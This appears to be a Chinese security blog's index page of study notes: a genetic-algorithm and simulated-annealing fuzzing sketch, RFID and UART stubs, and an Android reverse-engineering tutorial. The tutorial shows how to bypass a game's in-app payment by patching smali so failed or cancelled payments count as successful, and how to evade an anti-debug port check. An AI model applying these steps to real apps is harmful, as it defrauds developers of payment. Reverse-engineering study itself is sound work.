<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/12/18/%E6%97%A0%E7%BA%BF%E7%94%B5%E7%AC%94%E8%AE%B0/">无线电</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-12-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-12-18</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>a</p>

        <h1 id="RFID智能卡"   >
          <a href="#RFID智能卡" class="heading-link"><i class="fas fa-link"></i></a><a href="#RFID智能卡" class="headerlink" title="RFID智能卡"></a>RFID智能卡</h1>
      <p>Mifare Classic智能卡的加密算法：[proxmark.nl/files/Documents/13.56 MHz - MIFARE Classic/The_MIFARE_Hack.pdf](<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://proxmark.nl/files/Documents/13.56" >http://proxmark.nl/files/Documents/13.56</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> MHz - MIFARE Classic/The_MIFARE_Hack.pdf)</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/12/18/%E7%89%A9%E8%81%94%E7%BD%91%E7%AC%94%E8%AE%B0/">物联网</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-12-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-12-18</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>s是</p>
<p>UART接口</p>
<p>通过约定比特率进行通信，通常包含如下比特</p>
<ul>
<li>起始位：用于指示基于UART协议通信的起始位置</li>
<li>数据位：需要传输的实际数据</li>
<li></li>
</ul>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/12/13/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/">[ Untitled ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-12-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-12-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="遗传算法"   >
          <a href="#遗传算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h1>
      <p>常用步骤</p>
<p>变异、交叉、适应度计算、选择</p>

        <h2 id="变异（基因突变）"   >
          <a href="#变异（基因突变）" class="heading-link"><i class="fas fa-link"></i></a><a href="#变异（基因突变）" class="headerlink" title="变异（基因突变）"></a>变异（基因突变）</h2>
      <p>设置变异率，判断当前个体是否可以变异</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mutation_rate = <span class="number">0.1</span></span><br><span class="line"><span class="keyword">if</span> random.random() &lt; mutation_rate:</span><br><span class="line">	....</span><br></pre></td></tr></table></div></figure>

<p>设置个体变异比例，判断当前个体能够变异的bits在哪里</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mutate_point = random.sample(<span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(chromosome)), <span class="built_in">int</span>(<span class="built_in">len</span>(chromosome) * mutation_point_rate))</span><br><span class="line">mutate_point.sort()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mutate_point:</span><br><span class="line">    chromosome[i] = chromosome[i] ^ <span class="number">1</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="交叉（染色体交换）"   >
          <a href="#交叉（染色体交换）" class="heading-link"><i class="fas fa-link"></i></a><a href="#交叉（染色体交换）" class="headerlink" title="交叉（染色体交换）"></a>交叉（染色体交换）</h2>
      <p>可以设置一个交叉点，也可以设置多个交叉点，通常是百分之五十交叉</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 交叉操作</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crossover</span>(<span class="params">parent1, parent2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> random.random() &lt; crossover_rate:</span><br><span class="line">        <span class="comment"># 随机选择50个不同的交叉点</span></span><br><span class="line">        crossover_points = random.sample(<span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(parent1)), <span class="number">50</span>)</span><br><span class="line">        crossover_points.sort()  <span class="comment"># 将交叉点按顺序排列</span></span><br><span class="line">        child1 = []</span><br><span class="line">        child2 = []</span><br><span class="line">        parent_switch = <span class="literal">True</span>  <span class="comment"># 用于交替选择父代</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(parent1)):</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> crossover_points:</span><br><span class="line">                <span class="comment"># 如果当前位置是交叉点，则切换到另一个父代</span></span><br><span class="line">                <span class="comment">#print(&quot;test&quot;)</span></span><br><span class="line">                parent_switch = <span class="keyword">not</span> parent_switch</span><br><span class="line">            <span class="keyword">if</span> parent_switch:</span><br><span class="line">                child1.append(parent1[i])</span><br><span class="line">                child2.append(parent2[i])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                child1.append(parent2[i])</span><br><span class="line">                child2.append(parent1[i])</span><br><span class="line">        <span class="keyword">return</span> child1, child2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> parent1, parent2</span><br></pre></td></tr></table></div></figure>


        <h2 id="适应度计算"   >
          <a href="#适应度计算" class="heading-link"><i class="fas fa-link"></i></a><a href="#适应度计算" class="headerlink" title="适应度计算"></a>适应度计算</h2>
      <p>即将生成的后代个体与期望达到的目标进行对比，计算差距，即适应度。</p>
<ul>
<li>二进制测试：与能够触发crash的目标进行适应度计算</li>
<li>CANID测试：与能够响应车机的CANID进行适应度计算</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算适应度函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fitness</span>(<span class="params">chromosome</span>):</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_targets):</span><br><span class="line">        target_value = input_data[i]</span><br><span class="line">        binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, chromosome[i * num_bits:(i + <span class="number">1</span>) * num_bits]))</span><br><span class="line">        decimal_value = <span class="built_in">int</span>(binary_str, <span class="number">2</span>)</span><br><span class="line">        data.append(decimal_value)</span><br><span class="line">    fitness_value = <span class="built_in">sum</span>(<span class="built_in">abs</span>(data[i] - input_data[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_targets))</span><br><span class="line">    <span class="keyword">return</span> fitness_value</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>input_data</code>即为期望达到的目标</p>

        <h2 id="选择"   >
          <a href="#选择" class="heading-link"><i class="fas fa-link"></i></a><a href="#选择" class="headerlink" title="选择"></a>选择</h2>
      <p>当种群达到一定规模后，需要控制种群数量，留下更多的优质基因，那么这时候就需要进行自然选择了，也就是选择那些和期望目标差距更小，适应度更小的后代。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选择操作</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selection</span>(<span class="params">population</span>):</span></span><br><span class="line">    fitness_values = [fitness(chromosome) <span class="keyword">for</span> chromosome <span class="keyword">in</span> population]</span><br><span class="line">    total_fitness = <span class="built_in">sum</span>(fitness_values)</span><br><span class="line">    probabilities = [fitness_value / total_fitness <span class="keyword">for</span> fitness_value <span class="keyword">in</span> fitness_values]</span><br><span class="line">    selected_indices = random.choices(<span class="built_in">range</span>(population_size), probabilities, k=population_size)</span><br><span class="line">    selected_population = [population[i] <span class="keyword">for</span> i <span class="keyword">in</span> selected_indices]</span><br><span class="line">    <span class="keyword">return</span> selected_population</span><br></pre></td></tr></table></div></figure>


        <h2 id="去世"   >
          <a href="#去世" class="heading-link"><i class="fas fa-link"></i></a><a href="#去世" class="headerlink" title="去世"></a>去世</h2>
      <p>按理说应该要加入这个算法的，即当繁殖几代之后，那些老一代就应该死去，不管是不是最优的</p>

        <h2 id="主要遗传算法"   >
          <a href="#主要遗传算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#主要遗传算法" class="headerlink" title="主要遗传算法"></a>主要遗传算法</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主要遗传算法循环</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genetic_algorithm</span>():</span></span><br><span class="line">    <span class="comment"># print(&quot;aaaa&quot;)</span></span><br><span class="line">    population = initialize_population()</span><br><span class="line">    <span class="keyword">for</span> generation <span class="keyword">in</span> <span class="built_in">range</span>(num_generations):</span><br><span class="line">        population = selection(population)</span><br><span class="line">        new_population = []</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(new_population) &lt; population_size:</span><br><span class="line">            parent1, parent2 = random.sample(population, <span class="number">2</span>)</span><br><span class="line">            child1, child2 = crossover(parent1, parent2)</span><br><span class="line">            child1 = mutate(child1)</span><br><span class="line">            child2 = mutate(child2)</span><br><span class="line">            new_population.extend([child1, child2])</span><br><span class="line">        population = new_population</span><br><span class="line">        best_chromosome = <span class="built_in">min</span>(population, key=fitness)</span><br><span class="line">        best_data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_targets):</span><br><span class="line">            binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, best_chromosome[i * num_bits:(i + <span class="number">1</span>) * num_bits]))</span><br><span class="line">            decimal_value = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))</span><br><span class="line">            best_data.append(decimal_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Generation <span class="subst">&#123;generation + <span class="number">1</span>&#125;</span>: Fitness = <span class="subst">&#123;fitness(best_chromosome)&#125;</span>, Data = <span class="subst">&#123;best_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></div></figure>

<p>依据设定最大种群数量，不断进行繁殖，直到种群数量已满，再进行下一轮的繁殖得到的后代应该进行自然选择。</p>

        <h1 id="模拟退火"   >
          <a href="#模拟退火" class="heading-link"><i class="fas fa-link"></i></a><a href="#模拟退火" class="headerlink" title="模拟退火"></a>模拟退火</h1>
      <p>主要就是降温和计算概率是否替换新的一代。</p>
<p>以旅行商TSP问题为例子</p>
<p>总的代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">simulated_annealing_tsp</span>(<span class="params">cities, initial_temperature=<span class="number">1000.0</span>, cooling_rate=<span class="number">0.95</span>, min_temperature=<span class="number">0.1</span></span>):</span></span><br><span class="line">    <span class="comment"># 生成一个初始路径</span></span><br><span class="line">    current_path = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(cities)))</span><br><span class="line">    random.shuffle(current_path)</span><br><span class="line">    current_distance = total_distance(current_path)</span><br><span class="line"></span><br><span class="line">    temperature = initial_temperature</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> temperature &gt; min_temperature:</span><br><span class="line">        <span class="comment"># 生成一个新路径</span></span><br><span class="line">        new_path = current_path.copy()</span><br><span class="line">        index1, index2 = random.sample(<span class="built_in">range</span>(<span class="built_in">len</span>(new_path)), <span class="number">2</span>)</span><br><span class="line">        new_path[index1], new_path[index2] = new_path[index2], new_path[index1]</span><br><span class="line">        new_distance = total_distance(new_path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断新路径是否被接受</span></span><br><span class="line">        <span class="keyword">if</span> new_distance &lt; current_distance:</span><br><span class="line">            current_path, current_distance = new_path, new_distance</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            delta = new_distance - current_distance</span><br><span class="line">            probability = math.exp(-delta / temperature)</span><br><span class="line">            <span class="keyword">if</span> random.random() &lt; probability:</span><br><span class="line">                current_path, current_distance = new_path, new_distance</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 降低温度</span></span><br><span class="line">        temperature *= cooling_rate</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> current_path, current_distance</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行模拟退火算法</span></span><br><span class="line">sa_best_path, sa_best_distance = simulated_annealing_tsp(cities)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最优路径:&quot;</span>, sa_best_path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最优距离:&quot;</span>, total_distance(sa_best_path))</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>设定初始温度，降温比例，最小温度，初代路径</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#初始温度</span></span><br><span class="line">initial_temperature=<span class="number">1000.0</span></span><br><span class="line"><span class="comment">#降温率</span></span><br><span class="line">cooling_rate=<span class="number">0.95</span></span><br><span class="line"><span class="comment">#最小温度</span></span><br><span class="line">min_temperature=<span class="number">0.1</span></span><br><span class="line"><span class="comment">#初代路径</span></span><br><span class="line">current_path = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(cities)))</span><br><span class="line">random.shuffle(current_path)</span><br><span class="line">current_distance = total_distance(current_path)</span><br><span class="line"></span><br><span class="line">temperature = initial_temperature</span><br></pre></td></tr></table></div></figure></li>
<li><p>判断是否达到最低温度</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> temperature &gt; min_temperature:</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>生成新的路径</p>
<ul>
<li><p>如果新的路径更优秀，距离更短，那么就直接替换</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成新的路径</span></span><br><span class="line">new_path = current_path.copy()</span><br><span class="line">index1, index2 = random.sample(<span class="built_in">range</span>(<span class="built_in">len</span>(new_path)), <span class="number">2</span>)</span><br><span class="line">new_path[index1], new_path[index2] = new_path[index2], new_path[index1]</span><br><span class="line">new_distance = total_distance(new_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断新路径是否被接受，如果距离更短，无条件接收</span></span><br><span class="line"><span class="keyword">if</span> new_distance &lt; current_distance:</span><br><span class="line">    current_path, current_distance = new_path, new_distance</span><br></pre></td></tr></table></div></figure></li>
<li><p>如果新的一代更差，那么就依据当前温度，计算替换概率，（温度越高，概率越大），概率越大的，新的替换旧的概率就越大，然后降低问题。</p>
<p>这个计算概率不知道怎么个计算法</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#计算概率</span></span><br><span class="line">    delta = new_distance - current_distance</span><br><span class="line">    probability = math.exp(-delta / temperature)</span><br><span class="line">    <span class="comment">#依据概率判断是否进行距离路径替换</span></span><br><span class="line">    <span class="keyword">if</span> random.random() &lt; probability:</span><br><span class="line">        current_path, current_distance = new_path, new_distance</span><br></pre></td></tr></table></div></figure></li>
<li><p>降低温度</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 降低温度</span></span><br><span class="line">temperature *= cooling_rate</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>依次类推，直到达到最低温度跳出循环</p>
</li>
</ul>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/19/Android%E9%80%86%E5%90%91/">Android逆向</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-10-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-03-20</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="教我兄弟学Android逆向"   >
          <a href="#教我兄弟学Android逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#教我兄弟学Android逆向" class="headerlink" title="教我兄弟学Android逆向"></a>教我兄弟学Android逆向</h1>
      
        <h2 id="03-破解第一个Android游戏"   >
          <a href="#03-破解第一个Android游戏" class="heading-link"><i class="fas fa-link"></i></a><a href="#03-破解第一个Android游戏" class="headerlink" title="03 破解第一个Android游戏"></a>03 破解第一个Android游戏</h2>
      
        <h3 id="切水果大作战"   >
          <a href="#切水果大作战" class="heading-link"><i class="fas fa-link"></i></a><a href="#切水果大作战" class="headerlink" title="切水果大作战"></a>切水果大作战</h3>
      
        <h4 id="方法一"   >
          <a href="#方法一" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-642371-1-2.html" >《新人贴》初次尝试破解内购小游戏：切水果大作战 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>正常打开搜索失败字符串即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230918145730271.png" alt="image-20230918145730271"></p>
<p>定位到找到对应的三个函数<code>payResultSuccess</code>和<code>payResultFalse</code>，<code>payResultCancel</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230918145809775.png" alt="image-20230918145809775"></p>
<p>可以用<code>jd-gui</code>打开分析代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230918145918972.png" alt="image-20230918145918972"></p>
<p>同样搜索可以定位到对应的函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230918145938340.png" alt="image-20230918145938340"></p>
<p>然后在<code>AndroidKill</code>的<code>smali</code>代码窗口中将<code>payResultSuccess</code>的代码原封不动复制到<code>payResultFalse</code>和<code>payResultCancel</code>即可，最后编译即可。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230918150342671.png" alt="image-20230918150342671"></p>

        <h4 id="方法二"   >
          <a href="#方法二" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4>
      <p>可以通过修改跳转来使得任意点击均可跳转到<code>payResultSuccess</code>。</p>
<p>全局搜索<code>payResultFalse</code>，在<code>MiGuSdkPay$1.smali</code>中有对应的<code>switch</code>跳转语句</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230918153302711.png" alt="image-20230918153302711"></p>
<p>这里的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.line 54</span><br><span class="line">packed-switch p1, :pswitch_data_0</span><br></pre></td></tr></table></div></figure>

<p>即为声明<code>switch</code>语句，跳转至<code>pswitch_data_0</code>，在这个结构语句里面具体进行跳转</p>
<figure class="highlight smali"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.line</span> 54<span class="keyword"></span></span><br><span class="line"><span class="keyword">:pswitch_data_0</span></span><br><span class="line"><span class="keyword">.packed</span>-switch 0x1</span><br><span class="line">   <span class="keyword"> :pswitch_0</span></span><br><span class="line">   <span class="keyword"> :pswitch_1</span><span class="keyword"></span></span><br><span class="line"><span class="keyword">.end packed</span>-switch</span><br></pre></td></tr></table></div></figure>

<p>那么就是值为0则跳转<code>pswitch_0</code>，为1则跳转<code>pswitch_1</code></p>
<p>查看对应的<code>java</code>源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230918152641129.png" alt="image-20230918152641129"></p>
<p>可以看到对应的一些跳转，依据选择不同，那么就在<code>smali</code>代码中修改对应的跳转即可，即将<code>pswitch_0</code>修改为<code>pswitch_1</code>即可。</p>

        <h2 id="08-IDA爆破签名验证"   >
          <a href="#08-IDA爆破签名验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#08-IDA爆破签名验证" class="headerlink" title="08 IDA爆破签名验证"></a>08 IDA爆破签名验证</h2>
      <p>主要获取到可以导入jni.h的知识，在TIPS</p>

        <h2 id="09-IDA动态破解登陆验证"   >
          <a href="#09-IDA动态破解登陆验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#09-IDA动态破解登陆验证" class="headerlink" title="09 IDA动态破解登陆验证"></a>09 IDA动态破解登陆验证</h2>
      <p>主要获取到IDA动态调试.so的知识，在TIPS</p>

        <h2 id="10-静态分析反调试apk"   >
          <a href="#10-静态分析反调试apk" class="heading-link"><i class="fas fa-link"></i></a><a href="#10-静态分析反调试apk" class="headerlink" title="10 静态分析反调试apk"></a>10 静态分析反调试apk</h2>
      <p>init_array和JNI_OnLoad会在so加载的时候就开始执行，所以程序也有可能会在这里开启线程进行反调试。</p>

        <h3 id="反调试点"   >
          <a href="#反调试点" class="heading-link"><i class="fas fa-link"></i></a><a href="#反调试点" class="headerlink" title="反调试点"></a>反调试点</h3>
      <ul>
<li><p>checkport</p>
<p>在MainActivity中调用了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117150345567.png" alt="image-20240117150345567"></p>
<p>如果存在结果，即0x5d8a=23946端口被占用，那么就会exit，否则就挑战成功。</p>
<p>可以通过android_server -p23947设置端口来绕过</p>
</li>
<li><p>init_array</p>
